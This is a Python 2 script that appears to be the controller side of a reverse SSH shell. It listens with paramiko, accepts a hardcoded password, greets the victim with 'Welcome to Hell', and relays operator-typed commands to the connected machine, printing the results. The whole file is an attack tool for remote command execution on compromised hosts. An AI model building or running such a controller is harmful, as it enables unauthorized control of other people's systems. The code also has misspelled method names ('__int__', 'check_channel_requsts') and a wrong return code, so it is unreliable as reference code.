import socket
import paramiko
import threading
import sys

# lets use the key from paramiko demo files
host_key = paramiko.RSAKey(filename='test_rsa.key')


class Server (paramiko.ServerInterface):


    def __int__(self):
        self.event = threading.Event()

    def check_channel_requsts(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.AUTH_FAILED

    def check_auth_password(self, username, password):
        if (username == 'andrew') and (password == 'server1'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

server = sys.argv[1]
ssh_port = int(sys.argv[2])

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print '[+] Listening for connection ...'
    client, addr = sock.accept()

except Exception, e:
    print '[-] Listen failed: ' + str(e)
    sys.exit(1)

print '[+] Got a connection!'

try:
    aoSession = paramiko.Transport(client)
    aoSession.add_server_key(host_key)
    server = Server()

    try:
        aoSession.start_server(server=server)

    except paramiko.SSHException, x:
        print '[-] SSH Negotiation failed.'

    chan = aoSession.accept(20)
    print '[+] Authenticated!'
    print chan.recv(1024)
    chan.send('Welcome to Hell')
    while True:
        try:
            command = raw_input('Enter command: ').strip('\n')
            if command != 'exit':
                chan.send(command)
                print chan.recv(1024) + '\n'
            else:
                chan.send('exit')
                print 'exiting'
                raise Exception ('exit')
        except KeyboardInterrupt:
            aoSession.close()
except Exception, e:
    print '[-] Caught exception: ' + str(e)
    try:
        aoSession.close()
    except:
        pass
    sys.exit(1)